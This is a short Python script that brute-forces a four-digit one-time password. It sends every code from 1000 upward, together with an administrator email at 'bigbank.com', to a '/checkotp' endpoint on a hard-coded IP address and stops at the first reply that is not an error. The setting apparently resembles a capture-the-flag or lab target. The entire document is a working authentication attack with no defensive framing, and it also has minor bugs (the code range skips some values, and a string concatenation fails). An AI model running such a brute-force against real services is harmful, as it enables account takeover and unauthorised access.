import requests
import json

print("Hello")
baseUrl = "http://192.184.222.3:8081"

def makeRequest(otp, email):
    global baseUrl
    data = { "otp": otp, "email": email }
    test = json.dumps(data)
    print("test is: " + test)
    headers = { "Content-Type": "application/json" }
    r = requests.post(baseUrl + "/checkotp", data = json.dumps(data), headers = headers)
    return r.json()

emailAddress = "admin@bigbank.com"

for otp in range(1000, 9999):
    resp = makeRequest(otp, emailAddress)
    if "Error" not in resp:
        print("Response: " + resp)
        print("Correct OTP is: " + str(otp))
        break
